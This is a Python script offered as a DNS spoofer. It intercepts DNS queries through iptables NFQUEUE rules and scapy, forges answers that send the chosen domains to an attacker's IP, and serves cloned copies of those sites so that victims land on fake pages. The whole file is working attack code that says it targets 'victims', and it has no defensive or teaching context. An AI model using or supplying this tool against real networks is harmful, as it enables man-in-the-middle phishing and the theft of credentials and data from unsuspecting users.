#!/usr/bin/env python3
"""
DNS Spoofer: Intercepts DNS queries for specified domains and returns
your HTTP server IP so victims hit your cloned site.
Usage: sudo python3 dns_spoof.py domain1.com domain2.net ... [-q QUEUE]
"""

import os
import threading
import argparse
from http.server import HTTPServer, SimpleHTTPRequestHandler
from socketserver import ThreadingMixIn
from netfilterqueue import NetfilterQueue
from scapy.all import IP, UDP, DNS, DNSQR, DNSRR, send

CLONE_DIR = "cloned_sites"

class MultiDomainHandler(SimpleHTTPRequestHandler):
    def translate_path(self, path):
        host = self.headers.get('Host','').split(':')[0]
        base = os.path.join(os.getcwd(), CLONE_DIR, host)
        if os.path.isdir(base):
            rel = os.path.normpath(path.lstrip('/').split('?',1)[0])
            full = os.path.join(base, rel)
            if os.path.isdir(full):
                full = os.path.join(full, 'index.html')
            return full
        # fallback to default behaviour
        return super().translate_path(path)

class ThreadedHTTP(ThreadingMixIn, HTTPServer):
    daemon_threads = True

def start_http(port: int, domains: list):
    server = ThreadedHTTP(('', port), MultiDomainHandler)
    print(f"[+] HTTP server on port {port} serving: {', '.join(domains)}")
    server.serve_forever()

def process_packet(pkt, spoof_map):
    sc = IP(pkt.get_payload())
    if sc.haslayer(DNSQR):
        qn = sc[DNSQR].qname
        if qn in spoof_map:
            dom = qn.decode().strip('.')
            print(f"[+] Spoofing DNS for {dom}")
            reply = (
                IP(src=sc.dst, dst=sc.src) /
                UDP(sport=53, dport=sc[UDP].sport) /
                DNS(
                    id=sc[DNS].id,
                    qr=1, aa=1,
                    qd=sc[DNS].qd,
                    an=DNSRR(rrname=qn, ttl=300,
                              rdata=spoof_map[qn])
                )
            )
            send(reply, verbose=False)
            pkt.drop()
            return
    pkt.accept()

def main():
    parser = argparse.ArgumentParser(
        description="DNS Spoofer - specify domains to hijack DNS queries for"
    )
    parser.add_argument(
        'domains',
        nargs='+',
        help='Domain(s) to spoof, e.g. example.com vulnweb.com'
    )
    parser.add_argument(
        '-q', '--queue',
        type=int,
        default=1,
        help='NetfilterQueue number (default: 1)'
    )
    args = parser.parse_args()

    # Prompt attacker IP at runtime
    attacker_ip = input("Enter your HTTP server IP (attacker IP): ").strip()
    if not attacker_ip:
        print("[!] Attacker IP is required.")
        return

    # Build mapping of b"domain." → attacker_ip
    spoof_map = { dom.encode() + b'.': attacker_ip for dom in args.domains }

    # Enable IP forwarding and hook DNS to NFQUEUE
    os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")
    os.system(f"iptables -I FORWARD -p udp --dport 53 -j NFQUEUE --queue-num {args.queue}")
    os.system(f"iptables -t nat -I PREROUTING -p udp --dport 53 -j NFQUEUE --queue-num {args.queue}")

    # Launch HTTP server (to serve cloned sites) on port 80
    threading.Thread(
        target=start_http,
        args=(80, args.domains),
        daemon=True
    ).start()

    # Bind NFQUEUE and start processing
    nfq = NetfilterQueue()
    nfq.bind(args.queue, lambda pkt: process_packet(pkt, spoof_map))
    print(f"[*] Waiting for DNS queries (queue {args.queue})…")
    try:
        nfq.run()
    except KeyboardInterrupt:
        print("\n[*] Cleaning up and exiting.")
        nfq.unbind()

if __name__ == "__main__":
    main()
